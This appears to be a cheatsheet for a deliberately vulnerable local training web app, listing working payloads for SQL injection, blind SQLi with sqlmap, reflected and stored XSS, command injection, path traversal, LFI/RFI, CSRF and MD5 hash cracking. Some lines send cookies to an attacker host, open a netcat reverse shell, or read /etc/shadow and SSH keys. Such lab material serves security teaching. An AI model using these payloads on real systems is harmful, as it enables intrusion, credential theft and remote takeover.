# Relay – Vulnerability Cheatsheet
> http://localhost:3000 · `npm start` in vuln-site/

---

## Accounts

| ID | Username  | Password     | MD5 Hash                         |
|----|-----------|--------------|----------------------------------|
| 1  | admin     | password     | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | gordonb   | abc123       | e99a18c428cb38d5f260853678922e03 |
| 3  | 1337      | charley      | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4  | pablo     | letmein      | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5  | smithy    | password     | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 6  | alice     | password123  | (CSRF demo victim)               |
| 7  | attacker  | hacked       | (CSRF demo attacker)             |

---

## 1 · SQL Injection → `/users?id=`

**Goal:** dump all usernames + password hashes

| Payload | Effect |
|---------|--------|
| `1` | show user 1 |
| `1' OR '1'='1` | return all users |
| `' OR 1=1 --` | same, cleaner syntax |
| `1' UNION SELECT 1,username,password,username,password FROM users --` | UNION dump — hashes appear in Name/Password columns |
| `1' ORDER BY 5 --` | confirm 5 columns exist |

**Login bypass** → `/login`
```
username: ' OR '1'='1' --
password: anything
```

---

## 2 · Blind SQLi → `/users/check?username=`

Returns `{ "available": true/false }` — no data shown, just yes/no.

| Payload | Tells you |
|---------|-----------|
| `admin` | user exists (false) |
| `nobody` | user doesn't exist (true) |
| `admin' AND 1=1 --` | true condition → "taken" |
| `admin' AND 1=2 --` | false condition → "available" |
| `admin' AND LENGTH(password)=32 --` | confirm MD5 length |
| `admin' AND SUBSTRING(password,1,1)='5' --` | first char of hash is '5'? |
| `admin' AND SUBSTRING(password,1,4)='5f4d' --` | probe 4 chars at once |

**Automate with sqlmap:**
```bash
sqlmap -u "http://localhost:3000/users/check?username=1" \
       --dbms=sqlite --level=2 --dump
```

**With Burp:** intercept the fetch request, send to Intruder, use a character wordlist on the SUBSTRING position.

---

## 3 · XSS Reflected → `/search?q=`

Input is echoed raw: `Showing results for: <INPUT>`

| Payload | Effect |
|---------|--------|
| `<script>alert(1)</script>` | basic alert |
| `<img src=x onerror=alert(document.cookie)>` | shows session cookie |
| `<svg onload=alert(1)>` | SVG vector |
| `"><script>alert(1)</script>` | break out of attribute context |

**Steal cookie (exfil to attacker server):**
```
<script>fetch('http://attacker/?c='+document.cookie)</script>
```

Share as a crafted link:
```
http://localhost:3000/search?q=<script>alert(document.cookie)</script>
```

---

## 4 · XSS Stored → `/feed`

Post content is saved to the DB and rendered unescaped for every visitor.

| Post content | Effect |
|--------------|--------|
| `<script>alert('stored XSS')</script>` | fires for every visitor |
| `<script>document.cookie</script>` | expose cookie in page |
| `<img src=x onerror="alert(document.domain)">` | no script tag needed |
| `<style>body{display:none}</style><h1 style="display:block">Hacked</h1>` | page defacement |

Difference from reflected: no special link needed — payload persists and fires automatically for everyone.

---

## 5 · Command Injection → `/tools` (ping form)

Server runs: `exec("ping -c 2 " + input)` — shell metacharacters are not stripped.

| Input | Runs |
|-------|------|
| `127.0.0.1` | normal ping |
| `127.0.0.1; whoami` | ping then whoami |
| `127.0.0.1; id` | current user + groups |
| `127.0.0.1; cat /etc/passwd` | read passwd file |
| `127.0.0.1; ls /` | list filesystem root |
| `127.0.0.1 && cat /proc/version` | kernel version |
| `; uname -a` | skip ping entirely |
| `127.0.0.1 | nc attacker 4444 -e /bin/sh` | reverse shell (if nc available) |

---

## 6 · Path Traversal → `/docs?file=`

Server does: `path.join(__dirname, 'files', input)` — `../` is not stripped.

| Input | Reads |
|-------|-------|
| `welcome.txt` | normal file |
| `../app.js` | server source code |
| `../database.js` | DB config + credentials |
| `../package.json` | dependency list |
| `../../etc/passwd` | system user list |
| `../../etc/shadow` | hashed system passwords (needs root) |
| `../../proc/self/environ` | process environment variables |
| `../../home/guy-crimson/.ssh/id_rsa` | SSH private key |

---

## 7 · File Inclusion (LFI + RFI) → `/docs?src=`

**LFI** — local path, base in `pages/` but traversable:

| Input | Effect |
|-------|--------|
| `home.html` | normal template |
| `../app.js` | server source (same as path traversal but different endpoint) |
| `../../etc/passwd` | system file |

**RFI** — starts with `http://` → server fetches the URL:

| Input | Effect |
|-------|--------|
| `http://localhost:3000/feed` | self-SSRF — server fetches its own page |
| `http://example.com` | fetch external content |
| `http://attacker/evil.txt` | include attacker-controlled content |

> In PHP, RFI executes the fetched code. Here we show the inclusion mechanism.

---

## 8 · CSRF → `/account` transfer form

No CSRF token. Cookie has `sameSite: false` so cross-origin forms attach it automatically.

**Steps:**
1. Log in as `alice / password123` at `http://localhost:3000`
2. While still logged in, open `http://localhost:3000/attacker.html` in the same browser
3. Click the button — alice's balance drops by $500, attacker receives it

**Zero-click variant:** uncomment `window.onload = attack` in `attacker.html` — just visiting the page is enough.

**Manual POST from another origin (curl simulation):**
```bash
# grab the session cookie from the browser first
curl -X POST http://localhost:3000/transfer \
     -b "connect.sid=YOUR_COOKIE_HERE" \
     -d "to=attacker&amount=500"
```

---

## Crack the hashes

```bash
# using hashcat with rockyou
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# using john
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# quick online lookup: crackstation.net
```

Hashes to crack (paste into a file or crackstation):
```
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
```
